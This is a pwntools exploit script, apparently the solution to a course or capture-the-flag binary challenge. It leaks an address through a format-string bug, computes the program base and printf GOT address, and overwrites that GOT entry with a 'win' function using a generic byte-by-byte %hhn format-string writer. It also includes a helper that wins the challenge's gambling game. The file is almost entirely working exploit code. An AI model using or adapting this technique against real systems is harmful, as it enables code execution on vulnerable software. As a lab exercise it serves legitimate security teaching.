#!/usr/bin/env python3

import math
from pwn import *

HOST = "6447.lol"
PORT = 4002

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

def build_format_string(target, goal, start_byte=1, max_write=8):
    WRAP = 0x100

    bytes_list = [(goal >> (8 * i)) & 0xff for i in range(max_write)]
    writes = [(byte_value, index) for index, byte_value in enumerate(bytes_list)]
    writes.sort(key=lambda x: x[0])

    payload = b''
    written = 0 

    for idx, (byte_value, i) in enumerate(writes):
        to_write = (byte_value - written) % WRAP
        if to_write > 0:
            payload += f"%{to_write}c".encode()
            written += to_write
        param_index = start_byte + idx
        payload += f"%{param_index}$hhn".encode()

    padding = b'A' * ((8 - (len(payload) % 8)) % 8)
    payload += padding

    for _, i in writes:
        payload += p64(target + i)

    return payload

def is_perfect_square(n):
    if n < 0:
        return False
    root = int(math.isqrt(n))
    return root * root == n

def is_fibonacci(n):
    n = int(n)
    return is_perfect_square(5 * n * n + 4) or is_perfect_square(5 * n * n - 4)

def gamble():
    P.recvuntil(b': ', drop=True)
    P.sendline(b"1")  # Send the amount to gamble

    P.recvuntil(b'1) ', drop=True)
    one = int(P.recvline().strip())  
    log.info(f'[1] : {one}')

    P.recvuntil(b'2) ', drop=True)
    two = int(P.recvline().strip())  
    log.info(f'[2] : {two}')

    P.recvuntil(b'3) ', drop=True)
    three = int(P.recvline().strip()) 
    log.info(f'[3] : {three}')

    P.recvuntil(b'4) ', drop=True)
    four = int(P.recvline().strip()) 
    log.info(f'[4] : {four}')

    P.recvuntil(b'5) ', drop=True)
    five = int(P.recvline().strip()) 
    log.info(f'[5] : {five}')
    
    if not is_fibonacci(one):
        P.sendline(b"1")
        log.info(f'Selected [1] : {one}')
    elif not is_fibonacci(two):
        P.sendline(b"2")
        log.info(f'Selected [1] : {two}')
    elif not is_fibonacci(three):
        P.sendline(b"3")
        log.info(f'Selected [3] : {three}')
    elif not is_fibonacci(four):
        P.sendline(b"4")
        log.info(f'Selected [4] : {four}')
    else:
        P.sendline(b"5")
        log.info(f'Selected [5] : {five}')
   
def exploit():
    payload = b'%8$p' # stores buffer
    P.sendlineafter(b'?\n', payload)
    P.sendlineafter(b'What will you do?\n', b'g')
    
    gamble()

    leak = P.recvuntil(b'!',drop=True)[14:]
    log.info(f"Leaked: {leak}")
    P.recvuntil(b'continue...\n', drop=True)

    base = int(leak, 16) - 0xd8 - 0x1e08        # try 0xd8 or 459
    win = base + 0x1219                         # win function
    target = base + 0x4258                      # printf GOT

    log.info(f"TARGET function address: {hex(target)}")
    log.info(f"WIN function address: {hex(win)}")

    payload = build_format_string(target, win, start_byte=8 + 9) # 9 bytes corresponds to initial length of payload before addresses are read
    log.info(f"Payload: {payload}")
    
    P.sendline()
    P.sendlineafter(b'What will you do?\n', b'c')
    P.sendlineafter(b'handle?\n', payload)
    P.sendlineafter(b'What will you do?\n', b'g')

    gamble()

    P.interactive()
    
if __name__ == '__main__':
    connect_binary()
    exploit()
